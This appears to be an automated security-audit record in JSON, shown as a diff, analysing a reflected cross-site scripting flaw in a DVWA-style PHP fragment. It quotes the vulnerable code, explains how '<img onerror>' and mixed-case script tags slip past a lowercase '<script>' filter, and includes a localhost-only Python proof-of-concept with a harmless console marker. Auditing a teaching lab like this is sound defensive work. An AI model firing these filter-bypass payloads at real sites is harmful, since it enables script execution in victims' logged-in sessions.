@@ -1,0 +1,127 @@
+{
+  "schema_version": "wp2-output-v1",
+  "sample_id": "XSS-002",
+  "input_version": "v2",
+  "prompt_version": "final-wp4-v2",
+  "analysis_stage": "parent",
+  "received_packet_ids": [
+    "XSS-002"
+  ],
+  "prediction": "存在候选",
+  "verdict": "待验证",
+  "confidence": {
+    "level": "high",
+    "reason": "片段内输入来源（第 4 行 GET name）、唯一处理（第 6 行大小写敏感的单字面量删除）、拼接点（第 8 行未编码写入 <pre>）与输出路径（外围赋值 page['body'] 后 dvwaHtmlEcho 输出）静态证据完整，且第 2 行显式关闭 X-XSS-Protection；仅外围渲染实现与模块路由未提供，故 verdict 保持待验证。"
+  },
+  "findings": [
+    {
+      "finding_id": "XSS-002-F1",
+      "vulnerability_type": "XSS",
+      "locations": [
+        {
+          "fragment_id": "XSS-002",
+          "line_start": 4,
+          "line_end": 4,
+          "quote": "if( array_key_exists( \"name\", $_GET ) && $_GET[ 'name' ] != NULL ) {"
+        },
+        {
+          "fragment_id": "XSS-002",
+          "line_start": 2,
+          "line_end": 2,
+          "quote": "header (\"X-XSS-Protection: 0\");"
+        },
+        {
+          "fragment_id": "XSS-002",
+          "line_start": 6,
+          "line_end": 6,
+          "quote": "$name = str_replace( '<script>', '', $_GET[ 'name' ] );"
+        },
+        {
+          "fragment_id": "XSS-002",
+          "line_start": 8,
+          "line_end": 8,
+          "quote": "$html .= \"<pre>Hello {$name}</pre>\";"
+        }
+      ],
+      "data_flow": [
+        "入口：顶层请求处理逻辑读取 GET 参数 name，片段第 4 行以 array_key_exists 与 != NULL 判定其存在且非空，属反射型输入。",
+        "处理：第 6 行 $name = str_replace('<script>', '', $_GET['name']) 仅做一次区分大小写的字面子串删除，不是 HTML 实体编码，也不覆盖其它标签、属性或大小写变体。",
+        "拼接：第 8 行 $html .= \"<pre>Hello {$name}</pre>\" 把未编码的 $name 直接插入 HTML 元素内容，形成 <pre> 内的 HTML/属性解析上下文。",
+        "输出：外围处理器启动登录会话、按配置包含本片段，再把 $html 赋给 page['body']，最后由 dvwaHtmlEcho 输出到浏览器响应。",
+        "浏览器端：响应中的 <img src=x onerror=...> 由 HTML 解析器建立元素，加载失败触发内联事件处理器，形成脚本执行点。",
+        "旁路条件：第 2 行 header (\"X-XSS-Protection: 0\") 关闭旧版浏览器的 XSS 审计拦截，使反射路径少一层客户端缓解。"
+      ],
+      "principle": "反射型 XSS：GET 参数 name 未经 HTML 编码即拼入 <pre> 元素文本，唯一的处理是区分大小写的 <script> 字面量删除（黑名单），因此 <img onerror>、<svg onload> 及 <ScRiPt> 等变体可原样进入响应并由浏览器解析执行；服务器同时发送 X-XSS-Protection: 0 关闭旧版浏览器过滤。",
+      "impact": "攻击者可构造携带事件处理器标签的链接，在受害者已登录会话的浏览器上下文中执行任意前端脚本，读取页面 DOM、以受害者身份发起操作或篡改页面内容；影响限于浏览器端与当前会话，属反射型（非持久）XSS。",
+      "preconditions": [
+        "外围处理器按包含本片段的配置加载，且模块路由可达（路由未在片段中给出）。",
+        "受害者已建立登录会话（外围处理器启动登录会话），或部署配置允许未认证访问该路径。",
+        "浏览器解析 <pre> 内的 HTML 标签：所有主流浏览器默认如此，除非响应头 CSP 禁止内联事件处理器。",
+        "响应回显阶段不额外做 HTML 编码（外围 dvwaHtmlEcho 实现未提供，需确认）。"
+      ],
+      "counterexamples": [
+        "若外围 dvwaHtmlEcho 或 page['body'] 渲染前对 $html 做 htmlspecialchars 等实体编码，则 <img> 标签以文本显示、不执行，本路径被阻断。",
+        "仅提交小写字面量 <script>...</script> 时会被第 6 行 str_replace 删除，该单一载荷形态不成立；但大小写变体与其它标签不受影响，故不构成整体排除。",
+        "若部署层启用 CSP 且不含 unsafe-inline，内联 onerror 被浏览器拦截，回显存在但不执行。",
+        "若难度配置或输入版本不同（其它写入/渲染实现），本片段的过滤与输出关系不能直接套用。"
+      ],
+      "poc": {
+        "status": "需人工适配",
+        "language": "python",
+        "code": "#!/usr/bin/env python3\n\"\"\"XSS-002 teaching-lab verification draft.\n\nSends one GET request with an inert marker payload and reads the response back.\nThe browser-execution step is separate and must be observed manually in a browser.\nLocal targets only; no cookie reading, no exfiltration.\n\"\"\"\nimport argparse\nimport sys\nimport urllib.error\nimport urllib.parse\nimport urllib.request\n\nMARKER = \"LLM_LAB_XSS\"\nPAYLOAD = '<img src=x onerror=\"console.log(`LLM_LAB_XSS`)\">'\n\n\nclass NoRedirect(urllib.request.HTTPRedirectHandler):\n    def redirect_request(self, req, fp, code, msg, headers, newurl):\n        raise urllib.error.HTTPError(req.full_url, code, \"redirect refused\", headers, fp)\n\n\ndef build_url(base, path, param, value):\n    url = base.rstrip(\"/\") + \"/\" + path.lstrip(\"/\")\n    sep = \"&\" if urllib.parse.urlparse(url).query else \"?\"\n    return url + sep + urllib.parse.urlencode({param: value})\n\n\ndef main():\n    parser = argparse.ArgumentParser(description=\"Reflected XSS request/readback draft for XSS-002\")\n    parser.add_argument(\"--base\", default=\"http://127.0.0.1\", help=\"lab base URL (local only)\")\n    parser.add_argument(\"--path\", required=True, help=\"module route from the deployment; route is not present in the audited fragment\")\n    parser.add_argument(\"--param\", default=\"name\", help=\"GET parameter name, taken from the audited fragment\")\n    parser.add_argument(\"--cookie-file\", default=None, help=\"file holding a Cookie header value for the lab session\")\n    args = parser.parse_args()\n\n    parsed = urllib.parse.urlparse(args.base)\n    if parsed.scheme not in (\"http\", \"https\") or parsed.hostname not in (\"127.0.0.1\", \"localhost\", \"::1\"):\n        sys.exit(\"refusing non-local target: %s\" % args.base)\n\n    target = build_url(args.base, args.path, args.param, PAYLOAD)\n    print(\"request: GET %s\" % target)\n\n    request = urllib.request.Request(target, method=\"GET\")\n    if args.cookie_file:\n        with open(args.cookie_file, \"r\", encoding=\"utf-8\") as handle:\n            request.add_header(\"Cookie\", handle.read().strip())\n\n    opener = urllib.request.build_opener(NoRedirect)\n    try:\n        with opener.open(request, timeout=10) as response:\n            status = response.getcode()\n            body = response.read().decode(\"utf-8\", \"replace\")\n    except urllib.error.HTTPError as err:\n        print(\"http error: %s\" % err.code)\n        sys.exit(2)\n    except urllib.error.URLError as err:\n        print(\"connection error: %s\" % err.reason)\n        sys.exit(3)\n\n    print(\"status: %s\" % status)\n    reflected = PAYLOAD in body\n    print(\"payload reflected verbatim: %s\" % reflected)\n    print(\"marker literal present: %s\" % (MARKER in body))\n    if reflected:\n        print(\"next step: open the printed URL in the browser and watch the devtools console for %s\" % MARKER)\n    else:\n        print(\"no verbatim reflection: record the exact response region before drawing any conclusion\")\n\n\nif __name__ == \"__main__\":\n    main()\n",
+        "artifact_path": null,
+        "dependencies": [
+          "Python 3.9+ 标准库（argparse、urllib）",
+          "可访问的本地授权部署（base URL、模块路由、登录会话 Cookie 由操作者提供）",
+          "现代浏览器（支持 HTML 事件处理器与模板字面量），用于人工观察控制台标记"
+        ],
+        "parameters": [
+          "base：靶场基址，默认 http://127.0.0.1，仅接受 localhost/127.0.0.1/::1",
+          "path：模块可达路由；审计片段未包含路由，必须由部署环境提供，不能套用其它样本路径",
+          "param：GET 参数名，固定为片段中的 name",
+          "cookie-file：可选，保存会话 Cookie 头的本地文件，不写入版本库、不在输出中打印"
+        ],
+        "steps": [
+          "1) 确认外围处理器已按包含本片段的配置加载，且登录会话与难度分支与实测环境一致。",
+          "2) 先不带载荷访问同一路由，记录正常页面中 <pre>Hello ...</pre> 区域的基线文本。",
+          "3) 运行脚本：python xss002_draft.py --base http://127.0.0.1 --path <实测路由> --param name --cookie-file <cookie文件>。",
+          "4) 脚本以 GET 提交载荷 '<img src=x onerror=\"console.log(`LLM_LAB_XSS`)`>'，该串不含小写 <script>，可穿过片段中的 str_replace。",
+          "5) 在浏览器中打开脚本打印的同一 URL（会话已登录），打开开发者工具 Console。",
+          "6) 观察 Console 是否出现 LLM_LAB_XSS，以及响应中 <pre>Hello ...</pre> 内是否原样保留未编码的载荷。",
+          "7) 若需第二个变体，使用 <ScRiPt>console.log('LLM_LAB_XSS')</ScRiPt>：str_replace 大小写敏感，该标签不被移除。",
+          "8) 结束后无需清理：该路径为反射型，不写入数据库；如页面允许存储则改用专用留言并删除该条。"
+        ],
+        "expected_observation": "响应 HTML 的 <pre>Hello {载荷}</pre> 区域中出现未经 HTML 编码的 <img src=x onerror=...> 属性文本，浏览器解析该 img 并因 src=x 加载失败触发 onerror，Console 打印 LLM_LAB_XSS；同一请求在参数缺省或纯文本输入时仅显示 Hello 文本，不产生控制台输出。",
+        "success_criteria": "1) 基线请求（无 name 参数或 name=test）的响应中 <pre>Hello</pre> 区域只含纯文本，Console 无标记；2) 同一会话、同一路由、仅改变 name 参数后，响应该区域逐字出现未编码的 <img src=x onerror=...> 且 Console 打印 LLM_LAB_XSS；3) 服务端去掉 name 或使用 name=<script>alert(1)</script> 时该标签被 str_replace 删除，用于确认过滤仅匹配该小写字面量而非输出编码；4) 控制台标记出现需与响应回显分开记录，HTTP 200 与回显本身不作为执行证据。",
+        "limitations": [
+          "片段未给出模块路由，path 必须由实测部署提供，不能从其它样本推断。",
+          "外围 dvwaPage.inc.php 与 dvwaHtmlEcho 的实际输出实现未提供，本地副本未验证（可能二次编码或加 CSP）。",
+          "PHP 版本、难度配置、认证开关与浏览器版本均未实测，载荷长度与浏览器兼容性需按实际环境调整。",
+          "环境若启用 CSP script-src 限制，内联事件处理器可能被浏览器拦截，此时回显存在但不执行。"
+        ],
+        "execution_status": "未运行"
+      }
+    }
+  ],
+  "exclusion_evidence": [],
+  "missing_context": [
+    "模块路由与入口文件名未提供，无法确认 name 参数在部署中的确切 URL。",
+    "外围处理器与 dvwaPage.inc.php / dvwaHtmlEcho 的实际实现未提供，无法确认输出阶段是否追加编码或 CSP。",
+    "PHP 版本、认证开关、难度配置与浏览器版本未实测。",
+    "未提供任何运行记录或响应报文，无法升级为确认。"
+  ],
+  "risk_notes": [
+    "第 2 行发送 X-XSS-Protection: 0，主动关闭旧版浏览器 XSS 过滤，属纵深防御削弱，风险超出单点反射路径。",
+    "黑名单式输入替换（仅删小写 <script>）易被大小写、属性事件与其它标签绕过，若同一辅助函数被其它模块复用，影响面可能扩大。"
+  ],
+  "quality_notes": [
+    "str_replace 黑名单过滤属过时且不可靠的输入净化方式，应改为输出阶段按上下文编码。",
+    "X-XSS-Protection 响应头已被现代浏览器废弃，设置为 0 无正向作用。"
+  ],
+  "limitations": [
+    "本次仅静态分析单个片段，未运行任何请求，结论为静态候选，verdict=待验证。",
+    "模块路由、外围渲染与认证配置缺失，POC 的 path 与会话需人工适配。",
+    "未验证浏览器实际执行，仅说明响应回显与解析条件；回显本身不证明脚本执行。"
+  ],
+  "runtime_evidence": []
+}
